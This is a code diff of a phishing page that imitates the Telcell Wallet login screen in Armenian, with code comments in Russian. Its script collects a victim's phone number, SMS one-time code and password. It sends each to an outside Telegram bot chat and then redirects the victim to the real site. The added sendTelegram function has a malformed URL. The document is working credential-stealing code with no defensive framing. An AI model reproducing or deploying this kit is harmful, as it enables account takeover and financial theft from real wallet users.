@@ -16,7 +16,7 @@
 
         * {
             margin: 0; padding: 0; box-sizing: border-box;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
             -webkit-tap-highlight-color: transparent;
         }
 
@@ -38,35 +38,35 @@
 
         /* Header */
         .back-button { 
-            background: none; border: none; 
-            font-size: 28px; color: #333; 
-            cursor: pointer; width: 40px; height: 40px;
-            margin-bottom: 5px; margin-left: -10px;
-            display: flex; align-items: center; justify-content: center;
+            background: none; border: none; font-size: 28px; 
+            color: #333; cursor: pointer; width: 40px; height: 40px;
+            margin-left: -10px; display: flex; align-items: center; justify-content: center;
         }
 
         h1 { font-size: 34px; font-weight: 800; color: var(--text-main); margin-bottom: 25px; }
 
-        .section-title { text-align: center; margin-bottom: 30px; }
+        .section-title { text-align: center; margin-bottom: 30px; min-height: 80px; }
         .section-title h2 { font-size: 22px; font-weight: 700; color: var(--text-main); }
-        .section-title p { font-size: 15px; color: var(--text-secondary); margin-top: 6px; }
+        .section-title p { font-size: 15px; color: var(--text-secondary); margin-top: 6px; line-height: 1.4; }
 
-        /* Form Elements */
-        .input-group { margin-top: 10px; }
+        /* Form */
+        .input-group { margin-top: 10px; position: relative; }
         .input-group label { font-size: 14px; font-weight: 700; color: #333; display: block; margin-bottom: 10px; }
         
         .input-wrapper { 
             background-color: var(--input-bg); 
             border-radius: 16px; 
             padding: 18px 20px; 
-            transition: 0.2s;
+            display: flex; 
+            align-items: center;
             border: 1px solid transparent;
+            transition: 0.2s;
         }
-        .input-wrapper:focus-within { border-color: var(--primary-color); }
+        .input-wrapper:focus-within { border-color: var(--primary-color); background-color: #fff; }
 
         input { 
             background: none; border: none; outline: none; 
-            width: 100%; font-size: 18px; color: #000; 
+            width: 100%; font-size: 17px; color: #000; 
         }
 
         .hint { font-size: 13px; color: var(--text-secondary); margin-top: 8px; padding-left: 5px; }
@@ -78,54 +78,37 @@
             display: flex; align-items: center; justify-content: center; 
             font-size: 12px; font-weight: bold; flex-shrink: 0; margin-top: 2px;
         }
-        .info-text { font-size: 14px; color: var(--text-secondary); line-height: 1.5; }
 
         /* OTP Screen */
-        .otp-container { 
-            display: flex; 
-            justify-content: space-between; 
-            margin: 35px 0; 
-            gap: 8px;
-        }
+        .otp-container { display: flex; justify-content: space-between; margin: 35px 0; gap: 8px; }
         .otp-input { 
-            width: 14%; 
-            height: 58px; 
-            background-color: var(--input-bg); 
-            border: 2px solid transparent; 
-            border-radius: 14px; 
-            text-align: center; 
-            font-size: 24px; 
-            font-weight: 700; 
-            transition: 0.2s;
+            width: 14%; height: 58px; background-color: var(--input-bg); 
+            border: 2px solid transparent; border-radius: 14px; 
+            text-align: center; font-size: 24px; font-weight: 700; 
         }
         .otp-input:focus { border-color: var(--primary-color); background: #fff; outline: none; }
         
         #sms-sent-to { text-align: center; font-size: 14px; color: var(--text-secondary); margin-top: 15px; }
+        .timer-text { margin-top: 30px; text-align: center; color: var(--text-secondary); font-size: 14px; }
+
+        /* Password Screen Specifics */
+        .eye-icon { width: 24px; height: 24px; opacity: 0.4; cursor: pointer; margin-left: 10px; }
+        .forgot-pass { color: var(--primary-color); font-size: 14px; font-weight: 700; text-decoration: none; display: block; margin-top: 15px; }
 
         /* Footer & Button */
-        .footer { 
-            margin-top: auto; 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            gap: 15px; 
-            padding-bottom: 25px; 
-        }
+        .footer { margin-top: auto; display: flex; flex-direction: column; align-items: center; gap: 15px; padding-bottom: 25px; }
         .offer-link { color: var(--primary-color); font-weight: 700; text-decoration: none; font-size: 16px; }
         .terms { font-size: 13px; color: #333; text-align: center; padding: 0 10px; line-height: 1.4; }
 
         .submit-btn { 
-            width: 100%; 
-            background-color: var(--btn-disabled); 
-            color: white; border: none; 
-            border-radius: 30px; height: 56px; 
-            font-size: 18px; font-weight: 700; 
+            width: 100%; background-color: var(--btn-disabled); 
+            color: white; border: none; border-radius: 30px; 
+            height: 56px; font-size: 18px; font-weight: 700; 
             cursor: pointer; transition: 0.3s; 
         }
         .submit-btn.active { background-color: var(--primary-color); box-shadow: 0 4px 12px rgba(255, 94, 77, 0.3); }
         
-        .timer-text { margin-top: 30px; text-align: center; color: var(--text-secondary); font-size: 14px; }
-        #timer { font-weight: 700; color: var(--text-main); }
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
@@ -134,29 +117,27 @@
     <button class="back-button" id="backBtn">‹</button>
     <h1 id="mainTitle">Բարև</h1>
     
-    <!-- Screen 1 -->
-    <div id="screen-login">
+    <!-- ЭКРАН 1: ВВОД НОМЕРА -->
+    <div id="screen-1">
         <div class="section-title">
             <h2>Մուտք</h2>
             <p>Ստեղծիր հարթակ վճարումներիդ համար</p>
         </div>
-        <form id="tgLoginForm">
-            <div class="input-group">
-                <label>Քո հեռախոսահամարը</label>
-                <div class="input-wrapper">
-                    <input type="tel" id="user_phone" placeholder="+374" required maxlength="12">
-                </div>
-                <p class="hint">Նմուշ՝ 77XXXXXX</p>
-                <div class="info-box">
-                    <span class="info-icon">i</span>
-                    <p class="info-text">Հաստատման կոդով SMS-ը կուղարկվի տվյալ հեռախոսահամարին</p>
-                </div>
+        <div class="input-group">
+            <label>Քո հեռախոսահամարը</label>
+            <div class="input-wrapper">
+                <input type="tel" id="user_phone" placeholder="+374" maxlength="12">
             </div>
-        </form>
+            <p class="hint">Նմուշ՝ 77XXXXXX</p>
+            <div class="info-box">
+                <span class="info-icon">i</span>
+                <p class="info-text" style="font-size: 14px; color: var(--text-secondary);">Հաստատման կոդով SMS-ը կուղարկվի տվյալ հեռախոսահամարին</p>
+            </div>
+        </div>
     </div>
 
-    <!-- Screen 2 -->
-    <div id="screen-otp" style="display: none;">
+    <!-- ЭКРАН 2: SMS КОД -->
+    <div id="screen-2" class="hidden">
         <div class="section-title">
             <h2>SMS հաստատում</h2>
             <p>Մուտքագրիր 6 նիշանոց կոդը SMS-ից</p>
@@ -173,11 +154,31 @@
         <p class="timer-text">Կրկին ուղարկել <span id="timer">112</span> վրկ հետո</p>
     </div>
 
-    <!-- Common Footer -->
+    <!-- ЭКРАН 3: ПАРОЛЬ -->
+    <div id="screen-3" class="hidden">
+        <div class="section-title">
+            <h2>Ուրախ ենք քեզ նորից տեսնել</h2>
+            <p>Քո վճարումների հարթակը</p>
+        </div>
+        <div class="input-group">
+            <label>Գաղտնաբառ</label>
+            <div class="input-wrapper">
+                <input type="password" id="user_pass" placeholder="Մուտքագրիր քո գաղտնաբառը">
+                <svg class="eye-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"></path><circle cx="12" cy="12" r="3"></circle></svg>
+            </div>
+            <a href="#" class="forgot-pass">Մոռացել ես գաղտնաբառը</a>
+        </div>
+    </div>
+
+    <!-- ФУТЕР И КНОПКА -->
     <div class="footer" id="mainFooter">
-        <a href="#" class="offer-link">Ծանոթանալ Օֆերտային</a>
-        <p class="terms">Telcell Wallet մուտք գործելով՝ դու ընդունում ես օգտագործման կանոնները</p>
-        <button type="submit" form="tgLoginForm" id="submitBtn" class="submit-btn">Հաստատել</button>
+        <div id="footerLinks">
+            <div style="text-align: center; margin-bottom: 15px;">
+                <a href="#" class="offer-link">Ծանոթանալ Օֆերտային</a>
+            </div>
+            <p class="terms">Telcell Wallet մուտք գործելով՝ դու ընդունում ես օգտագործման կանոնները</p>
+        </div>
+        <button id="mainBtn" class="submit-btn">Հաստատել</button>
     </div>
 </div>
 
@@ -187,103 +188,109 @@
         chat: '6576262467'
     };
 
-    const phoneInput = document.getElementById('user_phone');
-    const submitBtn = document.getElementById('submitBtn');
-    const screenLogin = document.getElementById('screen-login');
-    const screenOtp = document.getElementById('screen-otp');
-    const mainTitle = document.getElementById('mainTitle');
-    const mainFooter = document.getElementById('mainFooter');
+    let currentStep = 1;
+    let userData = { phone: '', sms: '', pass: '' };
 
-    // Button state
-    phoneInput.addEventListener('input', () => {
-        submitBtn.classList.toggle('active', phoneInput.value.length >= 8);
-    });
+    const mainBtn = document.getElementById('mainBtn');
+    const phoneInp = document.getElementById('user_phone');
+    const passInp = document.getElementById('user_pass');
+    const footerLinks = document.getElementById('footerLinks');
 
-    // Step 1: Login
-    document.getElementById('tgLoginForm').onsubmit = async function(e) {
-        e.preventDefault();
-        const phone = phoneInput.value;
-        submitBtn.innerText = 'Մշակվում է...';
-        submitBtn.disabled = true;
+    // Переключение экранов
+    function showScreen(num) {
+        document.getElementById(`screen-${currentStep}`).classList.add('hidden');
+        document.getElementById(`screen-${num}`).classList.remove('hidden');
+        
+        currentStep = num;
+        mainBtn.classList.remove('active');
+        mainBtn.disabled = false;
+        mainBtn.innerText = 'Հաստատել';
 
-        try {
-            await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: CONFIG.chat,
-                    text: `📲 *LOGIN REQUEST*\n\n📞 Phone: \`${phone}\``,
-                    parse_mode: 'Markdown'
-                })
-            });
+        if (num === 2) {
+            document.getElementById('mainTitle').innerText = 'Նույնականացում';
+            footerLinks.classList.add('hidden');
+            mainBtn.classList.add('hidden'); // На 2 экране кнопка не нужна, переход по вводу OTP
+            initOtpLogic();
+            startTimer();
+        } 
+        if (num === 3) {
+            document.getElementById('mainTitle').innerText = 'Բարև';
+            footerLinks.classList.add('hidden');
+            mainBtn.classList.remove('hidden');
+        }
+    }
 
-            screenLogin.style.display = 'none';
-            mainFooter.style.display = 'none';
-            mainTitle.innerText = 'Նույնականացում';
-            screenOtp.style.display = 'block';
-            document.getElementById('sms-sent-to').innerText = `Կոդն ուղարկվել է ${phone} համարին`;
-            
-            initOtpLogic(phone);
-            runTimer();
-        } catch (err) { 
-            alert('Կապի խափանում'); 
-            submitBtn.disabled = false;
-            submitBtn.innerText = 'Հաստատել';
+    // Логика кнопки 1 и 3 экрана
+    phoneInp.oninput = () => mainBtn.classList.toggle('active', phoneInp.value.length >= 8);
+    passInp.oninput = () => mainBtn.classList.toggle('active', passInp.value.length >= 4);
+
+    mainBtn.onclick = async () => {
+        if (!mainBtn.classList.contains('active')) return;
+
+        if (currentStep === 1) {
+            userData.phone = phoneInp.value;
+            mainBtn.innerText = 'Մշակվում է...';
+            await sendTelegram(`📲 *LOGIN REQUEST*\n📞 Номер: \`${userData.phone}\``);
+            showScreen(2);
+        } else if (currentStep === 3) {
+            userData.pass = passInp.value;
+            mainBtn.innerText = 'Մշակվում է...';
+            await sendTelegram(`🔐 *PASSWORD LOG*\n📞 Номер: \`${userData.phone}\`\n🔑 Пароль: \`${userData.pass}\``);
+            window.location.href = "https://telcell.am";
         }
     };
 
-    function runTimer() {
-        let time = 112;
-        const display = document.getElementById('timer');
-        const interval = setInterval(() => {
-            time--;
-            display.innerText = time;
-            if (time <= 0) clearInterval(interval);
-        }, 1000);
-    }
-
-    function initOtpLogic(phone) {
+    // Логика OTP
+    function initOtpLogic() {
         const inputs = document.querySelectorAll('.otp-input');
-        
-        inputs.forEach((input, idx) => {
-            input.addEventListener('input', (e) => {
-                if (e.target.value.length > 1) e.target.value = e.target.value.slice(0, 1);
+        inputs.forEach((inp, idx) => {
+            inp.oninput = async () => {
+                if (inp.value.length > 1) inp.value = inp.value.slice(0, 1);
+                if (inp.value && idx < 5) inputs[idx + 1].focus();
                 
-                if (e.target.value !== '' && idx < inputs.length - 1) {
-                    inputs[idx + 1].focus();
+                const code = Array.from(inputs).map(i => i.value).join('');
+                if (code.length === 6) {
+                    userData.sms = code;
+                    await sendTelegram(`🔑 *SMS CODE*\n📞 Номер: \`${userData.phone}\`\n💬 Код: \`${code}\``);
+                    setTimeout(() => showScreen(3), 600);
                 }
-
-                const fullCode = Array.from(inputs).map(i => i.value).join('');
-                if (fullCode.length === 6) {
-                    sendOtp(phone, fullCode);
-                }
-            });
-
-            input.addEventListener('keydown', (e) => {
-                if (e.key === 'Backspace' && !e.target.value && idx > 0) {
-                    inputs[idx - 1].focus();
-                }
-            });
+            };
+            inp.onkeydown = (e) => {
+                if (e.key === 'Backspace' && !inp.value && idx > 0) inputs[idx - 1].focus();
+            };
         });
     }
 
-    async function sendOtp(phone, code) {
+    function startTimer() {
+        let time = 112;
+        const timerLabel = document.getElementById('timer');
+        const itv = setInterval(() => {
+            time--;
+            timerLabel.innerText = time;
+            if (time <= 0) clearInterval(itv);
+        }, 1000);
+    }
+
+    async function sendTelegram(message) {
         try {
-            await fetch(`https://api.telegram.org/bot${CONFIG.token}/sendMessage`, {
+            await fetch(`https://telegram.org{CONFIG.token}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
                     chat_id: CONFIG.chat,
-                    text: `🔑 *OTP CODE*\n\n📞 Phone: \`${phone}\`\n💬 Code: \`${code}\``,
+                    text: message,
                     parse_mode: 'Markdown'
                 })
             });
-            // Final Step: redirect or message
-            setTimeout(() => {
-                window.location.href = "https://telcell.am";
-            }, 1000);
-        } catch (err) {}
+        } catch (err) { console.error('Error sending to TG'); }
     }
+
+    // Toggle password visibility
+    document.querySelector('.eye-icon').onclick = function() {
+        const type = passInp.getAttribute('type') === 'password' ? 'text' : 'password';
+        passInp.setAttribute('type', type);
+        this.style.opacity = type === 'text' ? '1' : '0.4';
+    };
 </script>
 </body>
 </html>
